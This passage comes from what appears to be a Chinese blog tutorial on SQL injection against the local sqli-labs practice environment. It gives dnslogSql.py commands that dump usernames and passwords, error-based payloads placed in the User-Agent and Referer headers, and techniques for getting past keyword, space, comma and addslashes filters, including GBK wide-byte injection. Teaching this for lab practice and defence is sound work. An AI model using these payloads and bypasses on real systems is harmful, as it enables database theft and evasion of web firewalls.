+<h3 id="相关使用"><a href="#相关使用" class="headerlink" title="相关使用"></a>相关使用</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python2 dnslogSql.py -u <span class="string">&quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&#x27; and (&#123;&#125;)--+&quot;</span> --dbs</span><br><span class="line">python2 dnslogSql.py -u <span class="string">&quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&#x27; and (&#123;&#125;)--+&quot;</span> -D security --tables</span><br><span class="line">python2 dnslogSql.py -u <span class="string">&quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&#x27; and (&#123;&#125;)--+&quot;</span> -D security -T users --columns</span><br><span class="line">python2 dnslogSql.py -u <span class="string">&quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&#x27; and (&#123;&#125;)--+&quot;</span> -D security -T users -C username,password --dump</span><br></pre></td></tr></table></figure>
+
+<h2 id="Post-Union注入"><a href="#Post-Union注入" class="headerlink" title="Post Union注入"></a>Post Union注入</h2><h3 id="Get提交与Post提交的区别"><a href="#Get提交与Post提交的区别" class="headerlink" title="Get提交与Post提交的区别"></a>Get提交与Post提交的区别</h3><p><code>get</code>提交可以被缓存，<code>post</code>提交不会被缓存</p>
+<p><code>get</code>提交参数会保留在浏览器的历史记录里，<code>post</code>提交不会</p>
+<p><code>get</code>提交可以被收藏为书签，<code>post</code>踢提交不可以</p>
+<p><code>get</code>提交有长度限制，最长<code>2048</code>个字符，<code>post</code>提交没有长度要求，不是只允许使用<code>ASCII</code>字符，还可以使用二进制数据</p>
+<h3 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h3><p><code>post</code>注入的方式与<code>get</code>注入方式相同，只不过需要使用<code>post</code>进行发送我们的注入语句</p>
+<p>一般<code>post</code>注入前，我们可以通过抓包获取到<code>post</code>发送的消息，将其发送的消息中插入我们的攻击语句即可</p>
+<h2 id="Post盲注"><a href="#Post盲注" class="headerlink" title="Post盲注"></a>Post盲注</h2><p><code>post</code>盲注方式和<code>get</code>盲注相同，同样<code>post</code>盲注的特点是需要使用<code>post</code>的方式进行发送请求包</p>
+<p>与一般的<code>union post</code>注入相同，我们需要先抓一下包，讲对应的请求信息进行构造，然后修改对应语句，插入我们攻击语句，达到攻击的目的</p>
+<h2 id="Http头UserAgent注入"><a href="#Http头UserAgent注入" class="headerlink" title="Http头UserAgent注入"></a>Http头UserAgent注入</h2><p>页面看不到明显变化，找不到注入点，我们可以尝试报头注入</p>
+<p>一般来说这种注入方式需要我们拥有对应的账户和密码，因为在此时我们登录上时会产生对应的<code>UserAgent</code>信息，我们可以通过<code>BurpSuit</code>抓包，然后修改对应的<code>UserAgent</code>信息，在里面加入我们的攻击代码。</p>
+<p>一般来说对于此种方式我们一般使用报错注入。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UserAgent: <span class="string">&#x27; or updatexml(1,(concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),3) #</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="主要过程"><a href="#主要过程" class="headerlink" title="主要过程"></a>主要过程</h3><p>开启代理，使用<code>BurpSuit</code>进行拦截数据包，将数据包的<code>UserAgent</code>信息进行修改，插入我们的注入代码，使用<code>Post</code>将修改后的数据提交，获取反馈信息</p>
+<h2 id="Http头Referer注入"><a href="#Http头Referer注入" class="headerlink" title="Http头Referer注入"></a>Http头Referer注入</h2><p>当我们访问一个页面时，会产生一个<code>referer</code>信息，记录了我们是从哪一个网站访问到这个页面的</p>
+<blockquote>
+<p>本来正确的单词应该是<code>referrer</code>，因为早期<code>HTTP</code>规范的拼写错误，为了保持向后兼容就讲错就错了</p>
+</blockquote>
+<p>与<code>UserAgent</code>注入相同，我们同样是需要进行抓包来获取到对应的请求信息，将对应的<code>referer</code>信息进行插入我们的注入语句,通常是使用报错注入的方式进行攻击</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="string">&#x27; or updatexml(1,(concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),3) #</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Http头Cookie注入"><a href="#Http头Cookie注入" class="headerlink" title="Http头Cookie注入"></a>Http头Cookie注入</h2><p><code>Cookie</code>相当于我们之前登录的一种凭证，在<code>Cookie</code>有效期内，客户端只需要向服务器发送<code>Cookie</code>进行验证，不需要再次输入用户名和密码</p>
+<p>如果<code>Cookie</code>(未加密)被放到服务器时数据库会进行解析，我们可以尝试进行注入</p>
+<p>一般在<code>Cookie</code>注入我们考虑顺序为：<code>Union</code>注入-&gt;报错注入-&gt;布尔盲注-&gt;时间盲注</p>
+<h2 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h2><h3 id="注释符号作用"><a href="#注释符号作用" class="headerlink" title="注释符号作用"></a>注释符号作用</h3><p>将后面不需要的语句注释掉，保证句子的完整性</p>
+<h3 id="常用注释符"><a href="#常用注释符" class="headerlink" title="常用注释符"></a>常用注释符</h3><p><code>--</code>、<code>#</code>、<code>%23</code></p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>可以手动在添加一个闭合方式，比如：闭合方式为<code>&#39;)</code>我们可以再添加一个<code>(&#39;</code>，使其前后完成闭合</p>
+<p>我们也可以使用等式</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>我们将后面的一个位置进行改为一个等式的判断，同时利用原来的方式进行闭合操作，那么我们遍可以绕过掉注释</p>
+<h2 id="and和or过滤"><a href="#and和or过滤" class="headerlink" title="and和or过滤"></a>and和or过滤</h2><p>一般<code>and</code>和<code>or</code>的过滤方式在源代码中使用正则匹配来进行匹配，对于匹配到后的替换为空字符，相当于将我们的输入中的<code>and</code>和<code>or</code>进行删除</p>
+<p>对于此种方式我们可以尝试使用以下方式绕过：</p>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>例如：<code>?id=1&#39; anD 1=1 --+</code></p>
+<h3 id="复写过滤字符"><a href="#复写过滤字符" class="headerlink" title="复写过滤字符"></a>复写过滤字符</h3><p>例如：<code>?id=1&#39; anandd 1=1 --+</code></p>
+<h3 id="使用替代"><a href="#使用替代" class="headerlink" title="使用替代"></a>使用替代</h3><p>使用<code>&amp;&amp;</code>或者是<code>||</code>来进行取代<code>and</code>和<code>or</code></p>
+<p>例如：<code>?id=1&#39; &amp;&amp; 1=1 --+</code></p>
+<p>如果直接使用<code>&amp;&amp;</code>或<code>||</code>发生报错时，我们可以将其转换为<code>url</code>编码进行输入</p>
+<h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h2><p>空格过滤在绕过防火墙有着比较实际的意义</p>
+<p>一般我们可以使用如下方式进行绕过：</p>
+<h3 id="使用加号"><a href="#使用加号" class="headerlink" title="使用加号"></a>使用加号</h3><p>如：<code>?id=1&#39;+and+1=1--+</code></p>
+<h3 id="使用URL编码"><a href="#使用URL编码" class="headerlink" title="使用URL编码"></a>使用URL编码</h3><p>我们可以将空格转换为<code>URL</code>编码<code>%20</code>尝试进行绕过，如<code>?id=1&#39;%20and%201=1--%20</code></p>
+<h3 id="使用注释"><a href="#使用注释" class="headerlink" title="使用注释"></a>使用注释</h3><p>我们也可以在中间可以插入<code>/**/</code>，来进行替代空格，如：<code>?id=1&#39;/**/and/**/1=1--/**/</code></p>
+<h3 id="使用Shell变量"><a href="#使用Shell变量" class="headerlink" title="使用Shell变量"></a>使用Shell变量</h3><p>我们可以使用<code>$IFS$1</code>来替代空格，因为<code>$IFS</code>默认是空字符(空格<code>Space</code>、<code>Tab</code>、换行<code>\n</code>)</p>
+<h3 id="使用报错注入"><a href="#使用报错注入" class="headerlink" title="使用报错注入"></a>使用报错注入</h3><p>我们可以使用报错注入来进行绕过空格输入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;||extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(database())))||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="使用括号"><a href="#使用括号" class="headerlink" title="使用括号"></a>使用括号</h3><p>我们可以将空格替换为括号进行包裹来进行绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema<span class="operator">=</span>database())</span><br></pre></td></tr></table></figure>
+
+<h2 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h2><p>我们可以使用<code>join</code>进行绕过</p>
+<blockquote>
+<p><code>join</code>用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段</p>
+</blockquote>
+<p>我们利用<code>join</code>的特性，则有如下等价：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>等价于</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>那么对于我们的查询我们可以修改括号内的数字，将其替换为我们的注入语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> database())b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>因为逗号被过滤了，我们使用<code>group_concat</code>中的逗号将会失效，我们只能对于一个个进行查找，如下示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> group_concat(username,password) <span class="keyword">from</span> users)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>上面的查询语句会被解析为<code>usernamepassword</code>，因此我们就只能改为单个进行查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Union和Select的绕过"><a href="#Union和Select的绕过" class="headerlink" title="Union和Select的绕过"></a>Union和Select的绕过</h2><p>我们一般先进行检测对应的闭合方式，随后检测空格等其他方式是否被过滤，之后测试<code>select</code>和<code>union</code></p>
+<h3 id="使用大小写"><a href="#使用大小写" class="headerlink" title="使用大小写"></a>使用大小写</h3><p>我们将<code>union</code>中的大小写进行改变，如：<code>unIoN</code></p>
+<h3 id="使用复写单词"><a href="#使用复写单词" class="headerlink" title="使用复写单词"></a>使用复写单词</h3><p>我们通过将<code>union</code>变形，在其中再插入一个<code>union</code>，如：<code>uniunionon</code></p>
+<h3 id="使用报错注入-1"><a href="#使用报错注入-1" class="headerlink" title="使用报错注入"></a>使用报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;||extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(database())))||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="使用url编码"><a href="#使用url编码" class="headerlink" title="使用url编码"></a>使用url编码</h3><p>我们可以将其中的一些字母转换为<code>url</code>编码尝试进行绕过</p>
+<h2 id="宽字节注入绕过"><a href="#宽字节注入绕过" class="headerlink" title="宽字节注入绕过"></a>宽字节注入绕过</h2><p>函数<code>addslashes()</code>函数在指定的预定义字符前添加反斜杠，这些字符是单引号(‘)、双引号(“)、反斜线(\)、NULL字符</p>
+<p>当存在这个过滤时，我们输入的<code>?id=1&#39; --+</code>会被转义为<code>?id=1\&#39; --+</code>那么数据库会去查找的是<code>1&#39;</code>这个东西</p>
+<p>因此我们使用宽字节注入的目的就是绕过这个转义的过程</p>
+<p>我们利用这种方式进行注入需要利用到<code>GBK编码</code>的特性，我们在单引号前加入一个<code>%df</code>形成<code>%df&#39;</code></p>
+<p>为什么这个方式就可以进行绕过呢？我们根据<code>addslashes()</code>函数的一个特性会在单引号前插入反斜线，在<code>GBK编码</code>中 \ 的编码位为<code>%5c</code>，则构成了一个<code>%df%5c&#39;</code>符合了<code>GBK编码</code>的取值范围(第一个字节129-254，第二个字节64-254)，则其会解析为一个汉字，然后由<code>addslashes()</code>函数所添加的 \ 便会失去应有的作用</p>
+<h2 id="一些其他绕过方式"><a href="#一些其他绕过方式" class="headerlink" title="一些其他绕过方式"></a>一些其他绕过方式</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>存在过滤时，如<code>union select</code>被防火墙过滤时，我们可以在中间插入注释来尝试混淆绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="comment">/*123*/</span> <span class="keyword">select</span></span><br></pre></td></tr></table></figure>
+
+<p>或者是被过滤时我们可以加上<code>!</code>让我们的注释会被执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!123*/</span><br></pre></td></tr></table></figure>
+
+<p>或者我们还可以加上一串数字如：50000</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!50000abc*/</span><br></pre></td></tr></table></figure>
+
+<p>这个表示数据库是<code>5.00.00</code>以上版本时，该语句才会被执行后面的<code>abc</code></p>
+<h3 id="空白符"><a href="#空白符" class="headerlink" title="空白符"></a>空白符</h3><p>使用<code>url</code>编码尝试绕过</p>
+<p><code>%09</code>：水平制表</p>
+<p><code>%0a</code>：新一行，<code>MySQL</code>可以让命令分行输入</p>
+<p><code>%0c</code>：新一页</p>
+<p><code>%0b</code>：纵向的 TabLayout</p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">万能符号：</span><br><span class="line"></span><br><span class="line">union select  --&gt;</span><br><span class="line"></span><br><span class="line">union/*//--/*/select</span><br><span class="line"></span><br><span class="line">union select 1,2,3  --&gt; </span><br><span class="line"></span><br><span class="line">union /*!--+/*%0aselect/*!1,2,*/ 3</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci='01ed89abee289d37f2f8'
+        data-cs='51741e819059e2ea7ab6c6f3d0fa0ac631d1d975'
+        data-r='equinox-shame.github.io'
+        data-o='Equinox-shame'
+        data-a='Equinox-shame'
+        data-d='false'
+    >查看评论</div>
+
+
+        
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
+        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
+        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
+        messageStyle: "none"
+    });
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+
+
+</html>
